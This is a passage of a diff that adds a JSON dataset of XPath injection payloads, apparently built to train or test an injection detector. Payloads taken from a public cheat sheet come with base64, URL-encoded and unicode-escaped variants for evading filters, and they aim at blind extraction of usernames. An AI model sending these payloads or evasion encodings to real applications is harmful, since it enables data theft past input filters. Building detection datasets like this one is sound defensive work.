+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "40497cc83ea81d7e6666efbe0cc25ce74be7a3a4bdf1bf4a5075aed9a78443f9",
+    "original_id": "raw_xpath_00012",
+    "original_payload": "and string-length(account)=SIZE_INT",
+    "obfuscated_payload": "YW5kIHN0cmluZy1sZW5ndGgoYWNjb3VudCk9U0laRV9JTlQ=",
+    "obfuscation_chain": [
+      "base64_standard"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "generic_base64",
+    "decoder_requirements": [
+      "base64_decode"
+    ],
+    "generation_seed": 208768384,
+    "equivalence_scope": "explicit-decoder-required"
+  },
+  {
+    "id": "raw_xpath_00012__obf03",
+    "payload": "and+string-length(account)=SIZE_INT",
+    "label": 1,
+    "attack_type": "xpath",
+    "attack_subtype": "external_curated",
+    "param_location": "query",
+    "source": "Generated:raw_xpath_00012",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/XPATH%20Injection/README.md",
+    "source_path": "XPATH Injection/README.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "40497cc83ea81d7e6666efbe0cc25ce74be7a3a4bdf1bf4a5075aed9a78443f9",
+    "original_id": "raw_xpath_00012",
+    "original_payload": "and string-length(account)=SIZE_INT",
+    "obfuscated_payload": "and+string-length(account)=SIZE_INT",
+    "obfuscation_chain": [
+      "whitespace_variant"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "specific",
+    "decoder_requirements": [],
+    "generation_seed": 208769393,
+    "equivalence_scope": "parser-or-runtime-dependent"
+  },
+  {
+    "id": "raw_xpath_00012__obf04",
+    "payload": "and%09string-length%28account%29%3DSIZE_INT",
+    "label": 1,
+    "attack_type": "xpath",
+    "attack_subtype": "external_curated",
+    "param_location": "query",
+    "source": "Generated:raw_xpath_00012",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/XPATH%20Injection/README.md",
+    "source_path": "XPATH Injection/README.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "40497cc83ea81d7e6666efbe0cc25ce74be7a3a4bdf1bf4a5075aed9a78443f9",
+    "original_id": "raw_xpath_00012",
+    "original_payload": "and string-length(account)=SIZE_INT",
+    "obfuscated_payload": "and%09string-length%28account%29%3DSIZE_INT",
+    "obfuscation_chain": [
+      "xpath_space_variant",
+      "url_encode_all"
+    ],
+    "obfuscation_depth": 2,
+    "obfuscation_profile": "hybrid",
+    "decoder_requirements": [
+      "url_decode"
+    ],
+    "generation_seed": 208770402,
+    "equivalence_scope": "normalization-layer-dependent"
+  },
+  {
+    "id": "raw_xpath_00013__obf01",
+    "payload": "subs%74ring(//use%72[userid=5]/us%65%72na%6D%65,%32,%31)=CHAR%5FHERE\n    subst%72in%67(//u%73er[useri%64=%35]/%75ser%6Eame,2,1)=cod%65point%73-to-st%72ing(INT_ORD_%43%48AR_%48ERE)",
+    "label": 1,
+    "attack_type": "xpath",
+    "attack_subtype": "external_curated",
+    "param_location": "query",
+    "source": "Generated:raw_xpath_00013",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/XPATH%20Injection/README.md",
+    "source_path": "XPATH Injection/README.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "8b847cabc44877d444854803548b2ca3cbeb83a8223a017aec0ee38f21314989",
+    "original_id": "raw_xpath_00013",
+    "original_payload": "substring(//user[userid=5]/username,2,1)=CHAR_HERE\n    substring(//user[userid=5]/username,2,1)=codepoints-to-string(INT_ORD_CHAR_HERE)",
+    "obfuscated_payload": "subs%74ring(//use%72[userid=5]/us%65%72na%6D%65,%32,%31)=CHAR%5FHERE\n    subst%72in%67(//u%73er[useri%64=%35]/%75ser%6Eame,2,1)=cod%65point%73-to-st%72ing(INT_ORD_%43%48AR_%48ERE)",
+    "obfuscation_chain": [
+      "url_encode_unreserved"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "generic_url",
+    "decoder_requirements": [
+      "url_decode"
+    ],
+    "generation_seed": 208867378,
+    "equivalence_scope": "normalization-layer-dependent"
+  },
+  {
+    "id": "raw_xpath_00013__obf02",
+    "payload": "c3Vic3RyaW5nKC8vdXNlclt1c2VyaWQ9NV0vdXNlcm5hbWUsMiwxKT1DSEFSX0hFUkUKICAgIHN1YnN0cmluZygvL3VzZXJbdXNlcmlkPTVdL3VzZXJuYW1lLDIsMSk9Y29kZXBvaW50cy10by1zdHJpbmcoSU5UX09SRF9DSEFSX0hFUkUp",
+    "label": 1,
+    "attack_type": "xpath",
+    "attack_subtype": "external_curated",
+    "param_location": "query",
+    "source": "Generated:raw_xpath_00013",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/XPATH%20Injection/README.md",
+    "source_path": "XPATH Injection/README.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "8b847cabc44877d444854803548b2ca3cbeb83a8223a017aec0ee38f21314989",
+    "original_id": "raw_xpath_00013",
+    "original_payload": "substring(//user[userid=5]/username,2,1)=CHAR_HERE\n    substring(//user[userid=5]/username,2,1)=codepoints-to-string(INT_ORD_CHAR_HERE)",
+    "obfuscated_payload": "c3Vic3RyaW5nKC8vdXNlclt1c2VyaWQ9NV0vdXNlcm5hbWUsMiwxKT1DSEFSX0hFUkUKICAgIHN1YnN0cmluZygvL3VzZXJbdXNlcmlkPTVdL3VzZXJuYW1lLDIsMSk9Y29kZXBvaW50cy10by1zdHJpbmcoSU5UX09SRF9DSEFSX0hFUkUp",
+    "obfuscation_chain": [
+      "base64_standard"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "generic_base64",
+    "decoder_requirements": [
+      "base64_decode"
+    ],
+    "generation_seed": 208868387,
+    "equivalence_scope": "explicit-decoder-required"
+  },
+  {
+    "id": "raw_xpath_00013__obf03",
+    "payload": "substring(//user[userid=5]/username,2,1)=CHAR_HERE\n%0Asubstring(//user[userid=5]/username,2,1)=codepoints-to-string(INT_ORD_CHAR_HERE)",
+    "label": 1,
+    "attack_type": "xpath",
+    "attack_subtype": "external_curated",
+    "param_location": "query",
+    "source": "Generated:raw_xpath_00013",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/XPATH%20Injection/README.md",
+    "source_path": "XPATH Injection/README.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "8b847cabc44877d444854803548b2ca3cbeb83a8223a017aec0ee38f21314989",
+    "original_id": "raw_xpath_00013",
+    "original_payload": "substring(//user[userid=5]/username,2,1)=CHAR_HERE\n    substring(//user[userid=5]/username,2,1)=codepoints-to-string(INT_ORD_CHAR_HERE)",
+    "obfuscated_payload": "substring(//user[userid=5]/username,2,1)=CHAR_HERE\n%0Asubstring(//user[userid=5]/username,2,1)=codepoints-to-string(INT_ORD_CHAR_HERE)",
+    "obfuscation_chain": [
+      "whitespace_variant"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "specific",
+    "decoder_requirements": [],
+    "generation_seed": 208869396,
+    "equivalence_scope": "parser-or-runtime-dependent"
+  },
+  {
+    "id": "raw_xpath_00013__obf04",
+    "payload": "c3Vic3RyaW5nKC8vdXNlclt1c2VyaWQ9NV0vdXNlcm5hbWUsMiwxKT1DSEFSX0hFUkUKJTA5c3Vic3RyaW5nKC8vdXNlclt1c2VyaWQ9NV0vdXNlcm5hbWUsMiwxKT1jb2RlcG9pbnRzLXRvLXN0cmluZyhJTlRfT1JEX0NIQVJfSEVSRSk",
+    "label": 1,
+    "attack_type": "xpath",
+    "attack_subtype": "external_curated",
+    "param_location": "query",
+    "source": "Generated:raw_xpath_00013",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/XPATH%20Injection/README.md",
+    "source_path": "XPATH Injection/README.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "8b847cabc44877d444854803548b2ca3cbeb83a8223a017aec0ee38f21314989",
+    "original_id": "raw_xpath_00013",
+    "original_payload": "substring(//user[userid=5]/username,2,1)=CHAR_HERE\n    substring(//user[userid=5]/username,2,1)=codepoints-to-string(INT_ORD_CHAR_HERE)",
+    "obfuscated_payload": "c3Vic3RyaW5nKC8vdXNlclt1c2VyaWQ9NV0vdXNlcm5hbWUsMiwxKT1DSEFSX0hFUkUKJTA5c3Vic3RyaW5nKC8vdXNlclt1c2VyaWQ9NV0vdXNlcm5hbWUsMiwxKT1jb2RlcG9pbnRzLXRvLXN0cmluZyhJTlRfT1JEX0NIQVJfSEVSRSk",
+    "obfuscation_chain": [
+      "whitespace_variant",
+      "base64_urlsafe_nopad"
+    ],
+    "obfuscation_depth": 2,
+    "obfuscation_profile": "hybrid",
+    "decoder_requirements": [
+      "base64url_decode_allow_missing_padding"
+    ],
+    "generation_seed": 208870405,
+    "equivalence_scope": "explicit-decoder-required"
+  },
+  {
+    "id": "raw_xpath_00014__obf01",
+    "payload": "substring%28%2F/user%5Buserid=5%5D%2Fusername%2C2%2C1%29%3DCHAR_HERE",
+    "label": 1,
+    "attack_type": "xpath",
+    "attack_subtype": "external_curated",
+    "param_location": "query",
+    "source": "Generated:raw_xpath_00014",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/XPATH%20Injection/README.md",
+    "source_path": "XPATH Injection/README.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "cba270fac34dff66bea91d50b7c509969363ffabef91950a25e353ad15871bc3",
+    "original_id": "raw_xpath_00014",
+    "original_payload": "substring(//user[userid=5]/username,2,1)=CHAR_HERE",
+    "obfuscated_payload": "substring%28%2F/user%5Buserid=5%5D%2Fusername%2C2%2C1%29%3DCHAR_HERE",
+    "obfuscation_chain": [
+      "url_encode_selective"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "generic_url",
+    "decoder_requirements": [
+      "url_decode"
+    ],
+    "generation_seed": 208967381,
+    "equivalence_scope": "normalization-layer-dependent"
+  },
+  {
+    "id": "raw_xpath_00014__obf02",
+    "payload": "c3Vic3RyaW5nKC8vdXNlclt1c2VyaWQ9NV0vdXNlcm5hbWUsMiwxKT1DSEFSX0hFUkU=",
+    "label": 1,
+    "attack_type": "xpath",
+    "attack_subtype": "external_curated",
+    "param_location": "query",
+    "source": "Generated:raw_xpath_00014",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/XPATH%20Injection/README.md",
+    "source_path": "XPATH Injection/README.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "cba270fac34dff66bea91d50b7c509969363ffabef91950a25e353ad15871bc3",
+    "original_id": "raw_xpath_00014",
+    "original_payload": "substring(//user[userid=5]/username,2,1)=CHAR_HERE",
+    "obfuscated_payload": "c3Vic3RyaW5nKC8vdXNlclt1c2VyaWQ9NV0vdXNlcm5hbWUsMiwxKT1DSEFSX0hFUkU=",
+    "obfuscation_chain": [
+      "base64_standard"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "generic_base64",
+    "decoder_requirements": [
+      "base64_decode"
+    ],
+    "generation_seed": 208968390,
+    "equivalence_scope": "explicit-decoder-required"
+  },
+  {
+    "id": "raw_xpath_00014__obf03",
+    "payload": "substring\\u0028//user[userid=5\\u005d/username,2,1)=CHAR_HERE",
+    "label": 1,
+    "attack_type": "xpath",
+    "attack_subtype": "external_curated",
+    "param_location": "query",
+    "source": "Generated:raw_xpath_00014",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/XPATH%20Injection/README.md",
+    "source_path": "XPATH Injection/README.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "cba270fac34dff66bea91d50b7c509969363ffabef91950a25e353ad15871bc3",
+    "original_id": "raw_xpath_00014",
+    "original_payload": "substring(//user[userid=5]/username,2,1)=CHAR_HERE",
+    "obfuscated_payload": "substring\\u0028//user[userid=5\\u005d/username,2,1)=CHAR_HERE",
+    "obfuscation_chain": [
+      "unicode_escape_punctuation"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "specific",
+    "decoder_requirements": [
+      "unicode_escape_decode"
+    ],
+    "generation_seed": 208969399,
+    "equivalence_scope": "normalization-layer-dependent"
+  },
+  {
+    "id": "raw_xpath_00014__obf04",
+    "payload": "c3Vic3RyaW5nKFx1MDAyZi91c2VyXHUwMDVidXNlcmlkXHUwMDNkNV1cdTAwMmZ1c2VybmFtZSwyLDEpPUNIQVJfSEVSRQ==",
+    "label": 1,
+    "attack_type": "xpath",
+    "attack_subtype": "external_curated",
+    "param_location": "query",
+    "source": "Generated:raw_xpath_00014",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/XPATH%20Injection/README.md",
+    "source_path": "XPATH Injection/README.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "cba270fac34dff66bea91d50b7c509969363ffabef91950a25e353ad15871bc3",
+    "original_id": "raw_xpath_00014",
+    "original_payload": "substring(//user[userid=5]/username,2,1)=CHAR_HERE",
+    "obfuscated_payload": "c3Vic3RyaW5nKFx1MDAyZi91c2VyXHUwMDVidXNlcmlkXHUwMDNkNV1cdTAwMmZ1c2VybmFtZSwyLDEpPUNIQVJfSEVSRQ==",
+    "obfuscation_chain": [
+      "unicode_escape_punctuation",
+      "base64_standard"
+    ],
+    "obfuscation_depth": 2,
+    "obfuscation_profile": "hybrid",
+    "decoder_requirements": [
+      "unicode_escape_decode",
+      "base64_decode"
+    ],
+    "generation_seed": 208970408,
+    "equivalence_scope": "explicit-decoder-required"
+  },
+  {
+    "id": "raw_xpath_00015__obf01",
+    "payload": "substring%28%2F%2Fuser%5Buserid%3D5%5D%2Fusername%2C2%2C1%29%3Dcodepoints-to-string%28INT_ORD_CHAR_HERE%29",
+    "label": 1,
+    "attack_type": "xpath",
+    "attack_subtype": "external_curated",
+    "param_location": "query",
+    "source": "Generated:raw_xpath_00015",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/XPATH%20Injection/README.md",
+    "source_path": "XPATH Injection/README.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "006e50cd2ffaaaf66a891f3750fcc79caaa4ea7a06f5cd1528fe76a845889541",
+    "original_id": "raw_xpath_00015",
+    "original_payload": "substring(//user[userid=5]/username,2,1)=codepoints-to-string(INT_ORD_CHAR_HERE)",
+    "obfuscated_payload": "substring%28%2F%2Fuser%5Buserid%3D5%5D%2Fusername%2C2%2C1%29%3Dcodepoints-to-string%28INT_ORD_CHAR_HERE%29",
+    "obfuscation_chain": [
+      "url_encode_all"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "generic_url",
+    "decoder_requirements": [
+      "url_decode"
+    ],
+    "generation_seed": 209067384,
+    "equivalence_scope": "normalization-layer-dependent"
+  },
+  {
+    "id": "raw_xpath_00015__obf02",
+    "payload": "c3Vic3RyaW5nKC8vdXNlclt1c2VyaWQ9NV0vdXNlcm5hbWUsMiwxKT1jb2RlcG9pbnRzLXRvLXN0cmluZyhJTlRfT1JEX0NIQVJfSEVSRSk=",
+    "label": 1,
+    "attack_type": "xpath",
+    "attack_subtype": "external_curated",
+    "param_location": "query",
+    "source": "Generated:raw_xpath_00015",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/XPATH%20Injection/README.md",
+    "source_path": "XPATH Injection/README.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "006e50cd2ffaaaf66a891f3750fcc79caaa4ea7a06f5cd1528fe76a845889541",
+    "original_id": "raw_xpath_00015",
+    "original_payload": "substring(//user[userid=5]/username,2,1)=codepoints-to-string(INT_ORD_CHAR_HERE)",
+    "obfuscated_payload": "c3Vic3RyaW5nKC8vdXNlclt1c2VyaWQ9NV0vdXNlcm5hbWUsMiwxKT1jb2RlcG9pbnRzLXRvLXN0cmluZyhJTlRfT1JEX0NIQVJfSEVSRSk=",
+    "obfuscation_chain": [
+      "base64_standard"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "generic_base64",
+    "decoder_requirements": [
+      "base64_decode"
+    ],
+    "generation_seed": 209068393,
+    "equivalence_scope": "explicit-decoder-required"
+  },
+  {
+    "id": "raw_xpath_00015__obf03",
+    "payload": "substring(\\u002f/user\\u005buserid\\u003d5\\u005d\\u002fusername,2,1)=codepoints-to-string\\u0028INT_ORD_CHAR_HERE\\u0029",
+    "label": 1,
+    "attack_type": "xpath",
+    "attack_subtype": "external_curated",
+    "param_location": "query",
+    "source": "Generated:raw_xpath_00015",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/XPATH%20Injection/README.md",
+    "source_path": "XPATH Injection/README.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "006e50cd2ffaaaf66a891f3750fcc79caaa4ea7a06f5cd1528fe76a845889541",
+    "original_id": "raw_xpath_00015",
+    "original_payload": "substring(//user[userid=5]/username,2,1)=codepoints-to-string(INT_ORD_CHAR_HERE)",
+    "obfuscated_payload": "substring(\\u002f/user\\u005buserid\\u003d5\\u005d\\u002fusername,2,1)=codepoints-to-string\\u0028INT_ORD_CHAR_HERE\\u0029",
+    "obfuscation_chain": [
+      "unicode_escape_punctuation"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "specific",
+    "decoder_requirements": [
+      "unicode_escape_decode"
+    ],
+    "generation_seed": 209069402,
+    "equivalence_scope": "normalization-layer-dependent"
+  },
+  {
+    "id": "raw_xpath_00015__obf04",
+    "payload": "c3Vic3RyaW5nKC9cdTAwMmZ1c2VyW3VzZXJpZFx1MDAzZDVdL3VzZXJuYW1lLDIsMSk9Y29kZXBvaW50cy10by1zdHJpbmdcdTAwMjhJTlRfT1JEX0NIQVJfSEVSRVx1MDAyOQ",
+    "label": 1,
+    "attack_type": "xpath",
+    "attack_subtype": "external_curated",
+    "param_location": "query",
+    "source": "Generated:raw_xpath_00015",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/XPATH%20Injection/README.md",
+    "source_path": "XPATH Injection/README.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "006e50cd2ffaaaf66a891f3750fcc79caaa4ea7a06f5cd1528fe76a845889541",
+    "original_id": "raw_xpath_00015",
+    "original_payload": "substring(//user[userid=5]/username,2,1)=codepoints-to-string(INT_ORD_CHAR_HERE)",
+    "obfuscated_payload": "c3Vic3RyaW5nKC9cdTAwMmZ1c2VyW3VzZXJpZFx1MDAzZDVdL3VzZXJuYW1lLDIsMSk9Y29kZXBvaW50cy10by1zdHJpbmdcdTAwMjhJTlRfT1JEX0NIQVJfSEVSRVx1MDAyOQ",
+    "obfuscation_chain": [
+      "unicode_escape_punctuation",
+      "base64_urlsafe_nopad"
+    ],
+    "obfuscation_depth": 2,
+    "obfuscation_profile": "hybrid",
+    "decoder_requirements": [
+      "unicode_escape_decode",
+      "base64url_decode_allow_missing_padding"
+    ],
+    "generation_seed": 209070411,
+    "equivalence_scope": "explicit-decoder-required"
+  }
+]
